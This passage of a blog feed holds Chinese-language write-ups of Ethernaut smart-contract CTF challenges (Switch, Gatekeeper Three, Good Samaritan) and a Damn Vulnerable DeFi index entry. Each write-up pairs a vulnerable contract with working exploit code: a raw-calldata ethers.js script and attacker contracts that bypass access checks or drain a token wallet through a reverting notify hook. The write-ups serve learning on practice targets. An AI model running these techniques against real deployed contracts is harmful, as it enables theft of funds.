        <content type="html"><![CDATA[<h1 id="digest"><a href="#digest" class="headerlink" title="digest"></a>digest</h1><ul><li>CTF site：<a href="https://www.damnvulnerabledefi.xyz/">https://www.damnvulnerabledefi.xyz/</a></li></ul><ul><li>version：2.2.0。version update introduction：<a href="https://www.damnvulnerabledefi.xyz/v2-release/">https://www.damnvulnerabledefi.xyz/v2-release/</a></li><li>solution reference<ul><li><a href="https://cmichel.io/damn-vulnerable-de-fi-solutions/">https://cmichel.io/damn-vulnerable-de-fi-solutions/</a></li><li><a href="https://medium.com/@balag3/damn-vulnerable-defi-walkthrough-223cdbaf216e">https://medium.com/@balag3/damn-vulnerable-defi-walkthrough-223cdbaf216e</a></li><li><a href="https://medium.com/@juanxaviervalverde">https://medium.com/@juanxaviervalverde</a></li><li><a href="https://thomasxu-blockchain.github.io/categories/">https://thomasxu-blockchain.github.io/categories/</a></li></ul></li></ul><p>how to play</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># clone</span><br><span class="line">git clone https://github.com/tinchoabbate/damn-vulnerable-defi.git</span><br><span class="line"># switch the branch </span><br><span class="line">git checkout v2.2.0</span><br><span class="line"># install the dependency</span><br><span class="line">yarn</span><br><span class="line"></span><br><span class="line"># test</span><br><span class="line">yarn xxx  (for example: yarn unstoppable )</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 05.Damn Vulnerable DeFi v2 CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>29.Switch</title>
      <link href="/2023/07/20/04.Ethernaut%20CTF/29.Switch/"/>
      <url>/2023/07/20/04.Ethernaut%20CTF/29.Switch/</url>
      
        <content type="html"><![CDATA[<h1 id="Switch"><a href="#Switch" class="headerlink" title="Switch"></a>Switch</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>要求：将switchOn设置为true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Switch &#123;</span><br><span class="line">    bool public switchOn; // switch is off</span><br><span class="line">    bytes4 public offSelector = bytes4(keccak256(&quot;turnSwitchOff()&quot;)); // 0x20606e15</span><br><span class="line"></span><br><span class="line">    modifier onlyThis() &#123;</span><br><span class="line">        require(msg.sender == address(this), &quot;Only the contract can call this&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOff() &#123;</span><br><span class="line">        // we use a complex data type to put in memory</span><br><span class="line">        bytes32[1] memory selector;</span><br><span class="line">        // check that the calldata at position 68 (location of _data)</span><br><span class="line">        assembly &#123;</span><br><span class="line">            calldatacopy(selector, 68, 4) // grab function selector from calldata</span><br><span class="line">        &#125;</span><br><span class="line">        require(</span><br><span class="line">            selector[0] == offSelector,</span><br><span class="line">            &quot;Can only call the turnOffSwitch function&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flipSwitch(bytes memory _data) public onlyOff &#123;</span><br><span class="line">        (bool success, ) = address(this).call(_data);</span><br><span class="line">        require(success, &quot;call failed :(&quot;);</span><br><span class="line">    &#125; // 30c13ade</span><br><span class="line"></span><br><span class="line">    function turnSwitchOn() public onlyThis &#123;</span><br><span class="line">        switchOn = true;</span><br><span class="line">    &#125; // 0x76227e12</span><br><span class="line"></span><br><span class="line">    function turnSwitchOff() public onlyThis &#123;</span><br><span class="line">        switchOn = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>考察calldata编码</p><ul><li><p>因为onlyThis的限制，所以需要调用<code>flipSwitch()</code>，然后本合约再去调用<code>turnSwitchOn()</code>完成题目。</p></li><li><p><code>onlyOff()</code></p><ul><li><p><code>calldatacopy(t, f, s)</code>：从位置f的calldata复制s字节到位置t的内存中，把输入数据加载到Memory中。那么这里就是将calldata的第68字节之后4个字节的数据复制到selector中，然后和offSelector作比较</p></li><li><p>不用担心4字节和32字节怎么比较，因为无论他是补0还是截断比较，只要前四字节相同，都是可以通过的（好吧是我不想研究它是补0比较还是截断比较的了:hankey:）</p></li><li><p>不要直接直接调用合约实例的flipSwitch()方法然后传参，这样是错的！因为你传入_data数据的时候，会自动帮你做ABI包装，这样就无法通过检查了，我们要自己构造calldata！然后用ethersjs发送原始数据进行交互</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    30c13ade // 这是flipSwitch()函数选择器</span><br><span class="line">0x000000000000000000000000000000000000000000000000000000000000000060 // 0x60之后的32字节是实际数据</span><br><span class="line">0x200000000000000000000000000000000000000000000000000000000000000000 // 补0</span><br><span class="line">0x4020606e1500000000000000000000000000000000000000000000000000000000 // 通过onlyOff()的检验</span><br><span class="line">0x600000000000000000000000000000000000000000000000000000000000000004 // turnSwitchOn()的函数选择器长度</span><br><span class="line">0x8076227e1200000000000000000000000000000000000000000000000000000000 // 根据长度截取内容，然后执行call()</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">const &#123;ethers&#125; = require(&quot;ethers&quot;)</span><br><span class="line"></span><br><span class="line">// 配置goerli网络提供者</span><br><span class="line">const provider = ethers.getDefaultProvider(&quot;https://eth-goerli.g.alchemy.com/v2/xxxxxxxxxxxxxx&quot;);</span><br><span class="line"></span><br><span class="line">// 以太坊钱包私钥</span><br><span class="line">const privateKey = &#x27;xxxxxxxxxxxxx&#x27;;</span><br><span class="line"></span><br><span class="line">// 根据私钥创建钱包</span><br><span class="line">const wallet = new ethers.Wallet(privateKey, provider);</span><br><span class="line"></span><br><span class="line">// 题目地址</span><br><span class="line">const toAddress = &#x27;0x5D342aa5Fb9aa061a90e1D40dE65a8719BbBf014&#x27;;</span><br><span class="line"></span><br><span class="line">// 要发送的原始数据</span><br><span class="line">const data = &#x27;0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000&#x27;;</span><br><span class="line"></span><br><span class="line">// 创建交易对象</span><br><span class="line">const transaction = &#123;</span><br><span class="line">  to: toAddress,</span><br><span class="line">  data: data,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 发送交易</span><br><span class="line">async function sendTransactionExample() &#123;</span><br><span class="line">  try &#123;</span><br><span class="line">    // 发送交易</span><br><span class="line">    const response = await wallet.sendTransaction(transaction);</span><br><span class="line"></span><br><span class="line">    console.log(&#x27;交易成功:&#x27;, response.hash);</span><br><span class="line">  &#125; catch (error) &#123;</span><br><span class="line">    console.error(&#x27;交易失败:&#x27;, error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sendTransactionExample();</span><br></pre></td></tr></table></figure><p><img src="https://moe.photo/images/2023/07/20/image-20230720004159583.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>28.Gatekeeper Three</title>
      <link href="/2023/07/19/04.Ethernaut%20CTF/28.Gatekeeper%20Three/"/>
      <url>/2023/07/19/04.Ethernaut%20CTF/28.Gatekeeper%20Three/</url>
      
        <content type="html"><![CDATA[<h1 id="Gatekeeper-Three"><a href="#Gatekeeper-Three" class="headerlink" title="Gatekeeper Three"></a>Gatekeeper Three</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>要求：成功调用<code>enter()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SimpleTrick &#123;</span><br><span class="line">  GatekeeperThree public target;</span><br><span class="line">  address public trick;</span><br><span class="line">  uint private password = block.timestamp;</span><br><span class="line"></span><br><span class="line">  constructor (address payable _target) &#123;</span><br><span class="line">    target = GatekeeperThree(_target);</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  function checkPassword(uint _password) public returns (bool) &#123;</span><br><span class="line">    if (_password == password) &#123;</span><br><span class="line">      return true;</span><br><span class="line">    &#125;</span><br><span class="line">    password = block.timestamp;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  function trickInit() public &#123;</span><br><span class="line">    trick = address(this);</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  function trickyTrick() public &#123;</span><br><span class="line">    if (address(this) == msg.sender &amp;&amp; address(this) != trick) &#123;</span><br><span class="line">      target.getAllowance(password);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; // 没有被调用过，没用的函数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperThree &#123;</span><br><span class="line">  address public owner;</span><br><span class="line">  address public entrant;</span><br><span class="line">  bool public allowEntrance;</span><br><span class="line"></span><br><span class="line">  SimpleTrick public trick;</span><br><span class="line"></span><br><span class="line">  function construct0r() public &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123; </span><br><span class="line">    require(msg.sender == owner); // 直接调用construct0r即可</span><br><span class="line">    require(tx.origin != owner); // 要用合约攻击</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(allowEntrance == true);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  // 1.创建一个trick：createTrick()</span><br><span class="line">  // 2.伪随机数，调用getAllowance()</span><br><span class="line"></span><br><span class="line">  modifier gateThree() &#123;</span><br><span class="line">    if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) == false) &#123;</span><br><span class="line">      _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  // 1.给这个合约转一点钱</span><br><span class="line">  // 2.owner是攻击合约，它没有fallback和receive来接收代币</span><br><span class="line"></span><br><span class="line">  function getAllowance(uint _password) public &#123;</span><br><span class="line">    if (trick.checkPassword(_password)) &#123; </span><br><span class="line">        allowEntrance = true;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function createTrick() public &#123;</span><br><span class="line">    trick = new SimpleTrick(payable(address(this)));</span><br><span class="line">    trick.trickInit();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter() public gateOne gateTwo gateThree &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive () external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>常规，思路写在了题目的代码中</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">contract attakcer&#123;</span><br><span class="line">  GatekeeperThree instance;</span><br><span class="line"></span><br><span class="line">  // 0xdc3bd7142542B9f35F8A22fC066645eA602fe2A3</span><br><span class="line">  function attack(GatekeeperThree _addr) public payable &#123;</span><br><span class="line">    instance = _addr;</span><br><span class="line"></span><br><span class="line">    // gate01</span><br><span class="line">    instance.construct0r();</span><br><span class="line"></span><br><span class="line">    // gate02</span><br><span class="line">    instance.createTrick();</span><br><span class="line">    instance.getAllowance(block.timestamp);</span><br><span class="line"></span><br><span class="line">    // gate03</span><br><span class="line">    // 0.001 ether + 1 wei = 1000000000000001</span><br><span class="line">    payable (address(instance)).transfer(1000000000000001);</span><br><span class="line"></span><br><span class="line">    // complete</span><br><span class="line">    instance.enter();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用过程</p><p><img src="https://moe.photo/images/2023/07/19/image-20230719214518636.png" alt></p><p>成功</p><p><img src="https://moe.photo/images/2023/07/19/image-20230719214534909.png" alt></p><p>小插曲：当我将攻击逻辑写道constructor的时候，一直失败。原因：构造器是payable，可以接收代币，因为还在创建constructor状态</p><p><img src="https://moe.photo/images/2023/07/19/image-20230719214632521.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>27.Good Samaritan</title>
      <link href="/2023/07/19/04.Ethernaut%20CTF/27.Good%20Samaritan/"/>
      <url>/2023/07/19/04.Ethernaut%20CTF/27.Good%20Samaritan/</url>
      
        <content type="html"><![CDATA[<h1 id="Good-Samaritan"><a href="#Good-Samaritan" class="headerlink" title="Good Samaritan"></a>Good Samaritan</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>要求：GoodSamaritan的wallet有很多钱，将其设置为0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/utils/Address.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract GoodSamaritan &#123;</span><br><span class="line">    Wallet public wallet;</span><br><span class="line">    Coin public coin;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        wallet = new Wallet();</span><br><span class="line">        coin = new Coin(address(wallet));</span><br><span class="line"></span><br><span class="line">        wallet.setCoin(coin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function requestDonation() external returns(bool enoughBalance)&#123;</span><br><span class="line">        // donate 10 coins to requester</span><br><span class="line">        try wallet.donate10(msg.sender) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; catch (bytes memory err) &#123;</span><br><span class="line">            if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123;</span><br><span class="line">                // send the coins left</span><br><span class="line">                wallet.transferRemainder(msg.sender);</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Coin &#123;</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    error InsufficientBalance(uint256 current, uint256 required);</span><br><span class="line"></span><br><span class="line">    constructor(address wallet_) &#123;</span><br><span class="line">        // one million coins for Good Samaritan initially</span><br><span class="line">        balances[wallet_] = 10**6;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address dest_, uint256 amount_) external &#123;</span><br><span class="line">        uint256 currentBalance = balances[msg.sender];</span><br><span class="line"></span><br><span class="line">        // transfer only occurs if balance is enough</span><br><span class="line">        if(amount_ &lt;= currentBalance) &#123;</span><br><span class="line">            balances[msg.sender] -= amount_;</span><br><span class="line">            balances[dest_] += amount_;</span><br><span class="line"></span><br><span class="line">            if(dest_.isContract()) &#123;</span><br><span class="line">                // notify contract </span><br><span class="line">                INotifyable(dest_).notify(amount_);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            revert InsufficientBalance(currentBalance, amount_);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Wallet &#123;</span><br><span class="line">    // The owner of the wallet instance</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    Coin public coin;</span><br><span class="line"></span><br><span class="line">    error OnlyOwner();</span><br><span class="line">    error NotEnoughBalance();</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        if(msg.sender != owner) &#123;</span><br><span class="line">            revert OnlyOwner();</span><br><span class="line">        &#125;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate10(address dest_) external onlyOwner &#123;</span><br><span class="line">        // check balance left</span><br><span class="line">        if (coin.balances(address(this)) &lt; 10) &#123;</span><br><span class="line">            revert NotEnoughBalance();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // donate 10 coins</span><br><span class="line">            coin.transfer(dest_, 10);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferRemainder(address dest_) external onlyOwner &#123;</span><br><span class="line">        // transfer balance left</span><br><span class="line">        coin.transfer(dest_, coin.balances(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setCoin(Coin coin_) external onlyOwner &#123;</span><br><span class="line">        coin = coin_;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface INotifyable &#123;</span><br><span class="line">    function notify(uint256 amount) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目的大概意思是：有一种代币coin，然后GoodSamaritan拥有一个钱包，这个钱包存有很多coin。GoodSamaritan很慷慨，可以给别人钱，但是每次只能给10元，我们得想办法一次性偷走它的所有钱。</p><p>这个向GoodSamaritan要钱的方法是一次申请10元，如果失败，则取走所有钱。本意是不够10元的时候拿走剩余的钱。那么我们可以在<code>donate10()</code>直接给他报错进入catch，就可以拿走所有钱了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function requestDonation() external returns(bool enoughBalance)&#123;</span><br><span class="line">        // donate 10 coins to requester</span><br><span class="line">        try wallet.donate10(msg.sender) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; catch (bytes memory err) &#123;</span><br><span class="line">            if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123;</span><br><span class="line">                // send the coins left</span><br><span class="line">                wallet.transferRemainder(msg.sender);</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果余额大于10元，那么就会转账10元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function donate10(address dest_) external onlyOwner &#123;</span><br><span class="line">    // check balance left</span><br><span class="line">    if (coin.balances(address(this)) &lt; 10) &#123;</span><br><span class="line">        revert NotEnoughBalance();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // donate 10 coins</span><br><span class="line">        coin.transfer(dest_, 10);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入到coin，在转账的时候，会调用转账目标地址的notify()函数，这是一个钩子函数，挺常见的。但是这里就存在大问题了，典型的未知合约位置方法实现，<code>notify()</code>可控。如果我们在notify中直接触发一个error，那么在<code>requestDonation()</code>中就会捕获到错误，然后转出剩下所有的钱，注意，报错的内容要是<code>NotEnoughBalance()</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address dest_, uint256 amount_) external &#123;</span><br><span class="line">        uint256 currentBalance = balances[msg.sender];</span><br><span class="line"></span><br><span class="line">        // transfer only occurs if balance is enough</span><br><span class="line">        if(amount_ &lt;= currentBalance) &#123;</span><br><span class="line">            balances[msg.sender] -= amount_;</span><br><span class="line">            balances[dest_] += amount_;</span><br><span class="line"></span><br><span class="line">            if(dest_.isContract()) &#123;</span><br><span class="line">                // notify contract </span><br><span class="line">                INotifyable(dest_).notify(amount_);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            revert InsufficientBalance(currentBalance, amount_);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那么实现可以是下面这样。注意了，当我们调用<code>transferRemainder()</code>转走所有coin的时候也会调用钩子函数，因此需要判断条件，不能直接revert。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function notify(uint256 amount) external pure &#123;</span><br><span class="line">    if (amount == 10) &#123;</span><br><span class="line">        revert NotEnoughBalance();</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">interface IGoodSamaritan &#123;</span><br><span class="line">  function requestDonation() external returns (bool);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">contract attacker &#123;  </span><br><span class="line"></span><br><span class="line">  error NotEnoughBalance();</span><br><span class="line"></span><br><span class="line">  function attack(address _addr) external &#123; </span><br><span class="line">     IGoodSamaritan(_addr).requestDonation();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function notify(uint256 amount) external pure &#123;</span><br><span class="line">    if (amount == 10) &#123;</span><br><span class="line">        revert NotEnoughBalance();</span><br><span class="line">    &#125; </span><br><span class="line">  